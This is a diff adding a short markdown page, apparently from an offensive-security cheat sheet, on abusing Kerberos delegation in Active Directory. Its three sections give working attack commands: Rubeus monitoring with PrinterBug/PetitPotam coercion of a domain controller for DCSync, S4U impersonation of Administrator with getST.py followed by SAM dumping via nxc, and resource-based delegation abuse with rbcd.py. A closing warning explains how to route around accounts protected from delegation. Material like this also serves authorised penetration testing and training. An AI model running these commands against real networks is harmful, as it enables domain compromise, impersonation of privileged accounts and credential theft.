@@ -1,0 +1,35 @@
+---
+title: "Kerberos Delegation"
+---
+
+Delegation lets a service act on behalf of a user. Misconfigured, it leads straight to impersonation of privileged accounts.
+
+## Unconstrained
+
+A host with unconstrained delegation caches the TGT of anyone who authenticates to it. Coerce a DC to authenticate, capture its TGT, DCSync.
+
+```bash
+Rubeus.exe monitor /interval:5
+# then coerce: PrinterBug / PetitPotam against the DC
+```
+
+## Constrained (S4U)
+
+```bash
+# You control an account with "allowed to delegate to" a service
+getST.py -spn cifs/target $DOMAIN/svc:PASS -impersonate Administrator -dc-ip $DC
+export KRB5CCNAME=Administrator.ccache
+nxc smb target -k --sam
+```
+
+## Resource-Based (RBCD)
+
+```bash
+# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
+rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
+getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
+```
+
+<Warning>
+S4U impersonation of accounts marked "sensitive / cannot be delegated" (or Protected Users) will fail — pick a different admin.
+</Warning>
